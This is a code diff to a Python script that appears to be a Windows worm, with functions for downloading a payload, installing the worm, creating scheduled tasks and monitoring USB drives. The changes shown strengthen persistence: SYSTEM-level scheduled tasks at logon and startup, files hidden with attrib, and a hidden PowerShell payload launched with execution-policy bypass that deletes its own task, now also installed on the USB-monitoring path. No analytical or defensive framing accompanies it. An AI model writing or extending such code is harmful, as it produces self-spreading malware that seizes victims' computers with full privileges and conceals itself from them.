@@ -44,10 +44,10 @@ def download_payload():
                 subprocess.run(['attrib', '+h', '+s', '+r', PAYLOAD_PATH], shell=True)
         except: pass
 
-def create_scheduled_tasks():
+def create_scheduled_tasks(self_only = False):
     worm_cmd = f'schtasks /create /tn {WORM_TASK_NAME} /tr "{WORM_PATH}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
     subprocess.run(worm_cmd, shell=True)
-    if not os.path.exists(FLAG_FILE):
+    if not os.path.exists(FLAG_FILE) and not self_only:
         payload_cmd = f'schtasks /create /tn {PAYLOAD_TASK_NAME} /tr "powershell.exe -nop -w hidden -ep bypass -c \\"{PAYLOAD_PATH};schtasks /delete /tn {PAYLOAD_TASK_NAME} /f\\"" /sc onstart /ru SYSTEM /rl HIGHEST /f'
         subprocess.run(payload_cmd, shell=True)
         subprocess.run(f'schtasks /run /tn {PAYLOAD_TASK_NAME}', shell=True)
@@ -97,6 +97,8 @@ def main():
         download_payload()
         create_scheduled_tasks()
     else:
+        install_worm()
+        create_scheduled_tasks(self_only=True)
         monitor_usb()
 
 if __name__ == "__main__":
